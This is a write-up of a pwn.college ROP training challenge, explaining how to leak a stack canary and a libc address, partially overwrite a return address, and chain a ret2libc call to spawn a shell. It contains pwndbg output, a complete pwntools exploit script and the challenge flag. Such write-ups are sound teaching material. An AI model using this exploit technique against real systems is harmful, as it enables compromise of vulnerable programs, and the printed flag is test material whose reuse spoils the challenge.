---
layout: post
title: (ROP) level 13
categories: pwn.college ROP
date: 2025-07-12 01:32:02 +0300
tags: pwn.college stack-canary leak partial-overwrite jmp2start ret2libc PIE brute-force ROP 
---
## Information 
- category: pwn

## Description 
> Perform ROP when the function has a canary!

## Write-up
**PIE** and **Stack Canary** — How Do We Bypass Them?
This binary has two common protections enabled:
- **PIE (Position Independent Executable)** — makes function addresses change every run.
- **Stack Canary** — detects stack corruption and prevents classic buffer overflows.

So how do we bypass them?

**Run the Program and Look for Leaks**
```bash 
babyrop_level13.1 
###
### Welcome to /challenge/babyrop_level13.1!
###

[LEAK] Your input buffer is located at: 0x7fff442d0bb0.

Address in hex to read from:
```
**Stack Leak + Arbitrary Read**

As you can see, the program leaks the address of our input buffer.
This is extremely useful — it gives us a foothold to calculate other addresses relative to it.

After that, the program prompts us to provide an address, then reads and prints memory from that location.

Now let’s switch to ```pwndbg``` and figure out **how far the stack canary is from our input buffer**.
> Knowing the offset is key to leaking the canary by ``[address of input buffer + offset]``.
{: .prompt-tip}
```plaintext
pwndbg> c
Continuing.
0x7ffe9ee44098
[LEAK] *0x7ffe9ee44098 = 0x886d7ea0e4d74100


Breakpoint 3, 0x000063b6fcebbd2e in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────
*RAX  0x7ffe9ee44040 —▸ 0x63b6fceba040 ◂— 0x400000006
 RBX  0x63b6fcebbd70 (__libc_csu_init) ◂— endbr64 
*RCX  0
*RDX  0x1000
*RDI  0
*RSI  0x7ffe9ee44040 —▸ 0x63b6fceba040 ◂— 0x400000006
*R8   0x2d
*R9   0x2d
*R10  0x63b6fcebc084 ◂— 0x697661654c000a0a /* '\n\n' */
 R11  0x246
 R12  0x63b6fcebb120 (_start) ◂— endbr64 
 R13  0x7ffe9ee44190 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffe9ee440a0 ◂— 0
 RSP  0x7ffe9ee43ff0 ◂— 0
*RIP  0x63b6fcebbd2e (main+332) ◂— call 0x63b6fcebb0f0
──────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────
 ► 0x63b6fcebbd2e <main+332>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffe9ee44040 —▸ 0x63b6fceba040 ◂— 0x400000006
        nbytes: 0x1000
 

──────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────
 ► 0   0x63b6fcebbd2e main+332
   1   0x72db05d8d083 __libc_start_main+243
   2   0x63b6fcebb14e _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> i f
Stack level 0, frame at 0x7ffe9ee440b0:
 rip = 0x63b6fcebbd2e in main; saved rip = 0x72db05d8d083
 called by frame at 0x7ffe9ee44180
 Arglist at 0x7ffe9ee440a0, args: 
 Locals at 0x7ffe9ee440a0, Previous frame's sp is 0x7ffe9ee440b0
 Saved registers:
  rbp at 0x7ffe9ee440a0, rip at 0x7ffe9ee440a8
pwndbg> dist $rsi 0x7ffe9ee440a8
0x7ffe9ee44040->0x7ffe9ee440a8 is 0x68 bytes (0xd words)
pwndbg> dist $rsi $rbp-0x8
0x7ffe9ee44040->0x7ffe9ee44098 is 0x58 bytes (0xb words)
pwndbg>
10:0080│-030 0x7ffe9ee44070 —▸ 0x72db05f5a2e8 (__exit_funcs_lock) ◂— 0
11:0088│-028 0x7ffe9ee44078 —▸ 0x63b6fcebbd70 (__libc_csu_init) ◂— endbr64 
12:0090│-020 0x7ffe9ee44080 ◂— 0
13:0098│-018 0x7ffe9ee44088 —▸ 0x63b6fcebb120 (_start) ◂— endbr64 
14:00a0│-010 0x7ffe9ee44090 —▸ 0x7ffe9ee44190 ◂— 1
15:00a8│-008 0x7ffe9ee44098 ◂— 0x886d7ea0e4d74100
16:00b0│ rbp 0x7ffe9ee440a0 ◂— 0
17:00b8│+008 0x7ffe9ee440a8 —▸ 0x72db05d8d083 (__libc_start_main+243) ◂— mov edi, eax ◂— ret 
```
**Putting It All Together — Leaking Canary and Libc, then ret2libc**
At this point, we know everything we need:

- The **offsets** to reach the **canary** and the **return address**
- A leaked pointer to ```__libc_start_main+243```
- And a helpful ```read```/```scanf``` mechanism that lets us control both memory and execution flow

**Leak the Stack Canary**
On the first interaction, we provide the address:

```plaintext
[buffer_address + canary_offset]
```

This lets us leak the **stack canary** using the program’s built-in memory read feature.
We record this value to safely bypass the canary check later.



**Partial Overwrite to Re-Enter Main**

The return address already ends with ``0x90`` (the low byte).
We can take advantage of this by **partially overwriting** the high byte(s) of the return address to jump back into ```main``` — this gives us a second chance to interact and build our full exploit.


**Leak the Libc Base**

For the second interaction, we want to leak the libc address.
We send:
```plaintext
[buffer_address + ret_offset]
```
This points to a saved return address on the stack — specifically a pointer to ```__libc_start_main+243```.

Because we **know the offset** of ```__libc_start_main+243``` in libc (```0x24083```), we can subtract and recover the **libc base**.



**ret2libc — Spawn a Shell**

On the second call to ```read```, we craft a final payload:

- Fill buffer until canary
- Insert the leaked canary
- Add padding to reach RIP
- Then place a **ROP chain**:
```python
payload += p64(pop_rdi)
payload += p64(next(lib.search(b"/bin/sh\x00")))
payload += p64(libc.symbols['system'])
```
This executes ```system("/bin/sh")``` and gives us a shell. 🎉

## Exploit
```python
from pwn import *

offset_canary = 0x58
offset_ret = 0x8
offset_start = 0x24083

def run():
    elf = context.binary = ELF("/challenge/babyrop_level13.1")
    return elf.process()

def leak(r,offset):
    r.recvuntil(b"located at: ") 
    address = int(r.recvline().strip(b".\n"),16)
    r.sendline(hex(address + offset))
    r.recvuntil(b"[LEAK] ")
    leaked = int(r.recvline().split(b" = ")[1].strip() ,16)

    print(f"{hex(leaked)}")
    return leaked 

def payload1(canary):
    fixed = b"\x90"
    high = [p8(i) for i in range(0x0f,0x10f,0x10)]

    return flat(
        b"b"*offset_canary,
        canary,
        b"B"*offset_ret,
        fixed + random.choice(high)
    )

def payload2(canary , libc):
    libcbase = libc - offset_start
    lib = ELF("/lib/x86_64-linux-gnu/libc.so.6") 
    lib.address = libcbase

    rop = ROP(lib)

    return flat(
        b"A" * offset_canary,
        canary,
        b"A" * 8,

        rop.ret.address,
        rop.rdi.address,
        
        next(lib.search(b"/bin/sh\x00")),
        lib.symbols["system"]
    )

def attack(p):
    canary = leak(p,offset_canary)
    log.success(f"Canary: {hex(canary)}")

    p.send(payload1(canary))

    try:
        if b"Welcome to" in p.recvuntil(b"Welcome to"):
            leak_base = leak(p,0x68)
            log.success(f"libc leak: {hex(leak_base-offset_start)}")
            
            p.send(payload2(canary,leak_base))
            p.interactive()
            print("HMMMMMMMM")
            return 1
    except Exception as e:
        log.failure(f"try again {e}")
    return False


def main():
    while True:
        p = run()
        try:
            if attack(p):
                break
        except Exception as e:
            log.warning(f"fail: {e}")
        finally:
            p.close()
 
if __name__ == "__main__":
    main()       
```

## Flag
> Flag:``` pwn.college{rasw_tPswS-zHS7TDZch7.0VO19q-EfLwczN4MDczW}```